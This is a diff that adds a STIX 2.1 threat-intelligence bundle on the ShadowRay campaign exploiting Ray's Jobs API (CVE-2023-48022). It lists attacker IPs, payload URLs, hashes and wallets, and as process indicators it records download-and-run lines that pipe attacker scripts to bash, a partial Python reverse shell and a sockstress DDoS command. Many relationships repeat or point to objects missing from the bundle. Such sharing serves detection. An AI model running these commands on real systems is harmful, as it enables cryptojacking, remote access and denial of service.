@@ -1,0 +1,729 @@
+{
+  "type": "bundle",
+  "id": "bundle--5953e9dd-d892-4078-a7c2-93c813eaf2ac",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "vulnerability",
+      "id": "vulnerability--16c4a522-2a06-400f-b511-dd21f5dde36e",
+      "name": "CVE-2023-48022",
+      "description": "A disputed vulnerability in Ray, an open-source AI framework, allowing unauthenticated remote code execution via the Jobs API. Exploited in the ShadowRay campaigns for initial access, lateral movement, and payload delivery. Remains unpatched due to Ray's design assumptions.",
+      "external_references": [
+        {
+          "source_name": "CVE",
+          "external_id": "CVE-2023-48022",
+          "url": "https://nvd.nist.gov/vuln/detail/cve-2023-48022"
+        },
+        {
+          "source_name": "Ray Security Docs",
+          "url": "https://docs.ray.io/en/latest/ray-security/index.html"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--094c167b-23c2-4f1d-a400-220161f09f0c",
+      "name": "Cryptojacking via Ray Cluster Exploitation",
+      "description": "Attackers exploit exposed Ray Jobs API (CVE-2023-48022) to deploy cryptocurrency miners (XMRig, Rigel) on compromised clusters, leveraging legitimate orchestration features and process masquerading.",
+      "external_references": [
+        {
+          "source_name": "Oligo Security",
+          "url": "https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--4d2aae13-d384-4e68-8d93-ca77126c1080",
+      "name": "Lateral Movement via Ray Node Scheduling",
+      "description": "Weaponization of Ray's NodeAffinitySchedulingStrategy to enumerate and compromise every alive node in a cluster, spreading malware laterally.",
+      "external_references": [
+        {
+          "source_name": "Ray Docs",
+          "url": "https://docs.ray.io/en/latest/ray-core/api/doc/ray.util.scheduling_strategies.NodeAffinitySchedulingStrategy.html"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--a0af7923-dad7-4feb-86d6-31fbc814e305",
+      "name": "Persistence via Cron and Systemd",
+      "description": "Attackers establish persistence by creating cron jobs (every 15 minutes), systemd/init.d services, and .bashrc injections to continuously re-download and execute malware.",
+      "external_references": [
+        {
+          "source_name": "Oligo Security",
+          "url": "https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--823849fd-82f0-4831-bcfb-dcfa2d036cec",
+      "name": "Masquerading as System Processes",
+      "description": "Malicious binaries and processes are renamed to appear as legitimate system components (e.g., kworker/0:0, dns-filter, .python3.6) to evade detection.",
+      "external_references": [
+        {
+          "source_name": "Oligo Security",
+          "url": "https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--da71a37d-efe5-490b-8455-a8ad5f987a17",
+      "name": "Region-Aware Payload Delivery",
+      "description": "Malware adapts payload delivery based on victim geolocation (e.g., run-CN.sh for China, run.sh for other regions), using proxies and regional CDNs to bypass censorship and optimize delivery.",
+      "external_references": [
+        {
+          "source_name": "Oligo Security",
+          "url": "https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--d065fb65-7485-49c9-bbad-eef843e61578",
+      "name": "Competition Elimination",
+      "description": "Malware actively detects and terminates rival cryptominers, blocks competing mining pools via hosts file and iptables, and protects its own mining process.",
+      "external_references": [
+        {
+          "source_name": "Oligo Security",
+          "url": "https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--63edd804-4567-4ada-862b-bdcef946c7cb",
+      "name": "Sensitive Data Exfiltration",
+      "description": "Attackers discover and exfiltrate credentials, proprietary AI models, source code, and datasets from compromised Ray clusters.",
+      "external_references": [
+        {
+          "source_name": "Oligo Security",
+          "url": "https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--7344f461-e553-4665-a273-835afba489c8",
+      "name": "DDoS via Compromised Clusters",
+      "description": "Deployment of sockstress and other tools to launch denial-of-service attacks from compromised Ray clusters, targeting production websites and mining pools.",
+      "external_references": [
+        {
+          "source_name": "Oligo Security",
+          "url": "https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--d1845d8f-9d40-434f-ba18-fb1443970c02",
+      "name": "Self-Propagation (Worm-like Behavior)",
+      "description": "Compromised clusters scan for additional exposed Ray dashboards and propagate malware, creating an autonomous, global botnet.",
+      "external_references": [
+        {
+          "source_name": "Oligo Security",
+          "url": "https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7",
+      "name": "Reverse Shell Establishment",
+      "description": "Attackers establish interactive reverse shells to AWS-hosted and other C2 servers, providing command-line access to compromised Ray clusters.",
+      "external_references": [
+        {
+          "source_name": "Oligo Security",
+          "url": "https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild"
+        }
+      ]
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--e420cbe9-ce99-4ea8-8b0b-33b4da2ec80e",
+      "value": "18.228.3.224"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--be3992ea-7c85-4ae5-9262-786b7a15d401",
+      "value": "45.95.168.100"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--dab01af0-24b4-434e-8c2f-7939e0b4b49d",
+      "value": "185.215.180.70"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--e032c9d1-13e6-4e20-8448-c5d6ab44ae15",
+      "value": "104.194.151.181"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--7ee24d1a-91b2-404e-803a-9b9ac3961ee1",
+      "value": "121.160.102.68"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--d4caf83e-844d-4673-af1f-32946cebd64d",
+      "value": "54.154.170.233"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--8ae6ca1f-e97d-469f-b733-b0a4971949bc",
+      "value": "158.160.123.117"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--0c04d151-b6ac-46b4-bb38-0d4e4f616f99",
+      "value": "193.29.224.83"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--9f1fb048-ab26-4151-a2ac-598925544be6",
+      "value": "162.248.53.119"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--866d8fbc-6466-4c9f-bc15-7e0447cf3cb6",
+      "value": "103.127.134.124"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--25167c43-baaa-4876-b390-e8d3cc2256bc",
+      "value": "18.230.118.147"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--fdf3ddd0-bdd0-4f59-bb13-956ebfa9e811",
+      "value": "67.217.57.240"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--3da00b15-0e95-4e2e-9892-9601691758e1",
+      "value": "45.61.150.83"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--b2cd2c5c-895f-46d3-8a3b-93d2d2d6f134",
+      "value": "*.oast.fun"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--cd97403b-177d-4b66-a970-de53b8fd073b",
+      "value": "bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--1f3612a6-228d-4338-b2de-35042b7e2301",
+      "value": "pool.supportxmr.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--349d0682-6c1d-4665-b78c-13ac8b317124",
+      "value": "gulf.moneroocean.stream"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--b0018b93-aa9b-49d5-80f5-fe51ef898fdd",
+      "value": "eu.zano.k1pool.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--1c97c685-686e-4f9e-a8d4-3ba4d514df09",
+      "value": "gh-proxy.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--9f3b8012-48b8-496c-8d8e-3077b3e21850",
+      "value": "github.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--943245d8-1d19-47ab-b2c3-8c367f947a62",
+      "value": "gitlab.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--865b9cdf-c051-4267-b356-91f127d72f08",
+      "value": "ip-api.com"
+    },
+    {
+      "type": "url",
+      "id": "url--6e6c7aef-2eba-48db-8fa3-eff3ae9a19e2",
+      "value": "https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh"
+    },
+    {
+      "type": "url",
+      "id": "url--e26de186-3ff4-4f3d-83fd-82eb08ad7fbe",
+      "value": "https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/aa.sh"
+    },
+    {
+      "type": "url",
+      "id": "url--86343df6-fa1c-4b75-9bf8-2c36aaa44890",
+      "value": "https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run.sh"
+    },
+    {
+      "type": "url",
+      "id": "url--923db6fb-1e5a-4510-b106-1e82cd3c1ff9",
+      "value": "https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run-CN.sh"
+    },
+    {
+      "type": "url",
+      "id": "url--922edd3f-7da7-4e38-94c4-458bf7acd599",
+      "value": "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz"
+    },
+    {
+      "type": "url",
+      "id": "url--290e92ff-a9f2-45b4-95df-f611bded2d52",
+      "value": "https://github.com/rigelminer/rigel/releases/download/1.22.3/rigel-1.22.3-linux.tar.gz"
+    },
+    {
+      "type": "url",
+      "id": "url--05120793-5aa2-4989-9619-6167912fa5ab",
+      "value": "http://45.61.150.83/1mmy/xd.sh"
+    },
+    {
+      "type": "url",
+      "id": "url--c4a3185d-b588-40d8-b4f7-465d08fb962f",
+      "value": "http://45.61.150.83/1mmy/cloud"
+    },
+    {
+      "type": "url",
+      "id": "url--88e489c3-8b9b-4e28-a72a-70641be97a91",
+      "value": "http://67.217.57.240:666/files/netsh"
+    },
+    {
+      "type": "sha256",
+      "id": "sha256--399f8625-2a0a-4a1b-a54c-8d301c3f58fa",
+      "hash_value": "6f445252494a0908ab51d526e09134cebc33a199384771acd58c4a87f1ffc063"
+    },
+    {
+      "type": "sha256",
+      "id": "sha256--2c4a266e-ee4c-435b-8de5-f1dcb436f9bc",
+      "hash_value": "1f6c69403678646a60925dcffe8509d22bb570c611324b93bec9aea72024ef6b"
+    },
+    {
+      "type": "md5",
+      "id": "md5--eeb67f98-be9f-4fb7-b6d5-63aeed22830b",
+      "hash_value": "1f63fa7921c2f5fb8f8ffa430d02ac4a"
+    },
+    {
+      "type": "sha1",
+      "id": "sha1--6aed6a97-ea8a-4092-9470-7c0b63b3d4a0",
+      "hash_value": "779a8af3b9838a33d1e199da3fc2f02a49e7c13e"
+    },
+    {
+      "type": "file",
+      "id": "file--1db31e73-da0c-4b50-8df9-332d4f4df5c9",
+      "name": "dns-filter",
+      "path": "/usr/lib/dev/systemdev/dns-filter"
+    },
+    {
+      "type": "file",
+      "id": "file--b65760d0-2169-47e4-b131-561d753a8e7a",
+      "name": ".python3.6"
+    },
+    {
+      "type": "file",
+      "id": "file--05423d92-bf27-42d1-bd45-4b972d06a6e7",
+      "name": "rigel"
+    },
+    {
+      "type": "file",
+      "id": "file--2c0c1ffc-12e9-471e-a8c6-7df6bfd55c0f",
+      "name": "python3.7.3"
+    },
+    {
+      "type": "file",
+      "id": "file--7111d454-b984-469c-83b9-2cef6afeaf77",
+      "name": "netsh"
+    },
+    {
+      "type": "file",
+      "id": "file--91cb164d-07c6-4c0f-b3e2-f6eddc62a732",
+      "name": "sockstress"
+    },
+    {
+      "type": "file",
+      "id": "file--04061498-3d76-4d90-bd85-99ca65be9d6f",
+      "name": "mon.sh"
+    },
+    {
+      "type": "file",
+      "id": "file--d32fe909-fedb-433e-9522-375db5ae5af3",
+      "name": "aa.sh"
+    },
+    {
+      "type": "file",
+      "id": "file--d7ab3352-3b06-40c6-aae0-c2bd3bb8d730",
+      "name": "aa_clean.sh"
+    },
+    {
+      "type": "file",
+      "id": "file--ff9ba363-6bd5-42e6-b161-08cbce84d3cf",
+      "name": "run.sh"
+    },
+    {
+      "type": "file",
+      "id": "file--49025aa7-4913-4004-9f3d-eab12f668a78",
+      "name": "run-CN.sh"
+    },
+    {
+      "type": "file",
+      "id": "file--e11deeb7-2ea0-437d-888f-ba9f32028225",
+      "name": ".ddns.sh",
+      "path": "/var/tmp/.ddns.sh"
+    },
+    {
+      "type": "file",
+      "id": "file--b7d5c440-8497-4a0d-ac50-bf57c0161741",
+      "name": "xd.sh"
+    },
+    {
+      "type": "file",
+      "id": "file--17ef318c-2ec1-4280-880d-4f203b038a92",
+      "name": "cloud.txt"
+    },
+    {
+      "type": "process",
+      "id": "process--fa0dba25-6929-4d44-ac7e-767e90675265",
+      "command_line": "/usr/lib/dev/systemdev/dns-filter -o [host] --tls"
+    },
+    {
+      "type": "process",
+      "id": "process--8918f90b-6eb8-4038-a771-2415858b6451",
+      "command_line": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(([host],[port]));"
+    },
+    {
+      "type": "process",
+      "id": "process--0fe1b436-8c8e-4459-bb90-9ffd81959221",
+      "command_line": "./sockstress eth0 -p payloads/http"
+    },
+    {
+      "type": "process",
+      "id": "process--e516e44d-7990-4cee-9214-acd6b0aab344",
+      "command_line": "/bin/bash /var/tmp/.ddns.sh"
+    },
+    {
+      "type": "process",
+      "id": "process--fab2f1a6-39bf-4fd1-87f5-213974e98b9f",
+      "command_line": "curl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun"
+    },
+    {
+      "type": "process",
+      "id": "process--3982f5c3-891c-4ea0-b7ce-860c90010709",
+      "command_line": "disown"
+    },
+    {
+      "type": "process",
+      "id": "process--182f9e83-896d-49f8-910e-126cd205d532",
+      "command_line": "uname -a"
+    },
+    {
+      "type": "process",
+      "id": "process--0a9a1b9f-49b1-4e7a-84fa-6c811f3c9f06",
+      "command_line": "id"
+    },
+    {
+      "type": "process",
+      "id": "process--39f55101-3aaf-4b3d-913e-e3270eea7a2f",
+      "command_line": "wget -O - https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash"
+    },
+    {
+      "type": "process",
+      "id": "process--e94e8de2-1950-4ad3-9bfa-338df8d4b44b",
+      "command_line": "curl -s https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash"
+    },
+    {
+      "type": "process",
+      "id": "process--6c6eec69-0ea4-46af-8a21-3bb6f4887635",
+      "command_line": "wget -qO- https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/aa.sh | tr -d \"\\r\" > aa_clean.sh && chmod +x aa_clean.sh && ./aa_clean.sh"
+    },
+    {
+      "type": "process",
+      "id": "process--8c356616-98ab-482f-9718-eccb87a51d4f",
+      "command_line": "echo \"kworker/0:0\" > /proc/$$/comm"
+    },
+    {
+      "type": "cryptocurrency-wallet",
+      "id": "cryptocurrency-wallet--902ab215-cb8a-430e-a3e9-f83e6cc40d5a",
+      "currency": "monero",
+      "address": "45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1"
+    },
+    {
+      "type": "cryptocurrency-wallet",
+      "id": "cryptocurrency-wallet--09a6bdba-d106-4574-9d24-d262d960043d",
+      "currency": "zano",
+      "address": "KrQtbtsrPTqSTzQwZZisiyJxgtcDMwrdVrQ"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--8b816dc3-9c49-488e-9136-ca31c9174fbb",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--870d230b-6f0d-41e6-992e-dbd1e8ff5e27",
+      "target_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--677eb7de-fc56-451f-a634-6cf0ebb31b07",
+      "relationship_type": "attributed-to",
+      "source_ref": "campaign--c1d4448f-265b-44ae-8cdb-4b6ce2043eb3",
+      "target_ref": "intrusion-set--870d230b-6f0d-41e6-992e-dbd1e8ff5e27"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--430bfe8c-3794-44d7-9a5a-f0f692ba637d",
+      "relationship_type": "uses",
+      "source_ref": "campaign--c1d4448f-265b-44ae-8cdb-4b6ce2043eb3",
+      "target_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--295d18a7-ed1b-4511-91ce-d12f98926c26",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "vulnerability--16c4a522-2a06-400f-b511-dd21f5dde36e"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--300a094f-0b39-4804-b7eb-c610768d65b1",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--5e4adbb4-a88b-43c3-b6fc-77a45e12df34",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--4bc4ed18-dd27-43cd-a7e9-413825cb5737",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--1c913309-a3e9-4abe-b4a6-ea93cda3a1ec",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--4b96a925-deca-4d8c-9a02-11d3ef60ba4c",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--43c6de8e-9e8e-48d8-9730-be6d3832fcd5",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--7394d4b6-5418-432a-a3a7-98acbee0b6cf",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--b0f9eb61-177e-4859-839d-6a0e15fc0722",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--3c8ffbd2-afff-4214-ad2b-142653a5a87d",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--5d60eb8b-ba10-446a-9035-d49ce251f5e1",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--1e34ab8a-ec38-45fd-a68d-7812cb9c43e7",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--e53621ca-b032-476a-ab4a-09ea2503d537",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--3edb1879-6386-4e06-982c-b54f07f3a135",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--b33beda6-70e9-43b1-b927-19d485883283",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--43285046-3bba-4c3f-87ff-6c2ebb903f7e",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--51f08e90-c9bd-4ae0-8975-6dcfeb0c02cb",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--a97cc00f-8107-4f5e-989f-97161ee97954",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--ec45d165-1853-41c6-9139-50250f93c715",
+      "relationship_type": "uses",
+      "source_ref": "malware--cc48bd1a-1212-42dc-a57c-f54f6e7a0a30",
+      "target_ref": "attack-pattern--658c4e1a-6e49-4b93-9d2a-5efaaf0747e7"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--3380d97d-6a3e-45f3-979d-54ba70128d0b",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--786acd2b-77b6-488d-9626-8a4dd3ac99aa",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--a6159a9a-ee58-4aad-8f47-726b5f6799b1",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--f506df1b-deb3-4065-8186-a1782e61fbac",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--4b14ab83-693a-432c-b856-dca0bcdc25b3",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--e552f80d-514a-4ea5-a902-61002d7257a2",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--137e6078-0f7d-460e-bf25-337644f2da60",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--7b06880e-6c2b-4e43-9adc-1a74fec8244a",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--fc67d600-b87a-4c54-8637-c9c76ef05e5d",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--433fb36f-11a2-4d50-baf3-41183fa94159",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--467ccedd-e9d1-42d5-a432-5af9a917746c",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--d618deac-0179-4284-afc6-1cc01b390233",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--4d188ede-620b-4cec-bbbb-dac791bb8527",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--a9f53cff-e526-4934-9e79-f9f944df733b",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--a47a7ba7-e84e-4dae-bcc3-e20ff2acc5fd",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--e0e05988-31f0-4c69-b523-42fff6075c73",
+      "relationship_type": "uses",
+      "source_ref": "tool--791e9654-4420-4bb9-a8dc-e3bd33fee96b",
+      "target_ref": "file--abeb54a4-67d7-4650-85b1-3c7cdeb231d2"
+    }
+  ]
+}
